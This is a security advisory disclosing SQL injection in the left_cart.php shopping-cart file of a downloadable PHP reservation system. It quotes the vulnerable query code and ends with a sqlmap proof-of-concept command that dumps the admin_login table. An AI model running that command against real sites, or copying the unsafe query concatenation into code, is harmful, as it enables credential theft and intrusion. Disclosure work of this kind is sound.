# SQL Injection Vulnerability in left_cart.php (Shopping Cart)

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)

**Download Link**: https://code-projects.org/online-product-reservation-system-in-php-with-source-code/

**Vulnerable File**: app/products/left_cart.php

**Version**: V1.0

**Description**:

A critical SQL injection vulnerability exists in the shopping cart functionality. The application directly concatenates POST parameter and session variable into multiple SQL queries (SELECT, UPDATE, INSERT) without validation, allowing attackers to extract data and manipulate cart contents.

### Analyse

**Vulnerability: SQL Injection in Multiple Queries**

```php
<?php include('../../config/config.php'); ?>
<?php
session_start();

// Line 5: User input from POST without validation
$prod = $_POST['id'];

// Line 7: User ID from session without validation
$id = $_SESSION['id'];

// Line 9: VULNERABLE! Direct concatenation into SELECT query
$icart = mysql_query("SELECT * FROM cart WHERE prod_id = '$prod' AND id = '$id'") or die(mysql_error());

$carito = mysql_fetch_array($icart);

$qty = $carito['qty'] + 1;

if( $carito['prod_id'] == $prod ){

    $prod = $_POST['id'];

    $id = $_SESSION['id'];

    // Line 22: VULNERABLE! Direct concatenation into UPDATE query
    mysql_query("UPDATE cart SET qty = '$qty' WHERE prod_id = '$prod' AND id = '$id' ") or die(mysql_error());

}else{

    $prod = $_POST['id'];

    $id = $_SESSION['id'];

    // Line 30: VULNERABLE! Direct concatenation into INSERT query
    mysql_query("INSERT INTO cart (id, prod_id, qty) VALUES ('$id', $prod, 1)") or die(mysql_error());

    }


// Line 35: VULNERABLE! Fourth injection point in another SELECT query
$mycart = mysql_query("SELECT * FROM cart LEFT JOIN products ON products.id = cart.prod_id WHERE cart.id = '$id'") or die(mysql_error());
$count = 0;
$item ="";
$totalqty = 0;
WHILE($cart = mysql_fetch_array($mycart)){

$count++;
$item .= "<img width='50' src='media/product/".$cart['image']."' alt='product_img'>";
$item .= $cart['name']." ".  $cart['price'] . " X " . $cart['qty'] ."<br />";
$totalqty += $cart['qty'] * $cart['price'];

}
```

**Vulnerability Analysis**:

1. **Multiple Injection Points**: `$_POST['id']` and `$_SESSION['id']` in 4 different queries
2. **POST Parameter Injection**: `id` parameter in SELECT, UPDATE, and INSERT queries (lines 9, 22, 30)
3. **Session Variable Injection**: `$_SESSION['id']` in all queries (lines 9, 22, 30, 35)
4. **No Input Validation**: Both POST and session data not validated
5. **No Prepared Statements**: Uses deprecated `mysql_query()` function
6. **Error Disclosure**: MySQL errors directly displayed to user

### POC

```bash
sqlmap -u "http://localhost:8081/app/products/left_cart.php" \
  --data="id=1" \
  --batch \
  -D cj_handgunner \
  -T admin_login \
  --dump
```

![1767438081025.png](https://youke3.picui.cn/s1/2026/01/03/6958f6cfce7a6.png)

**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
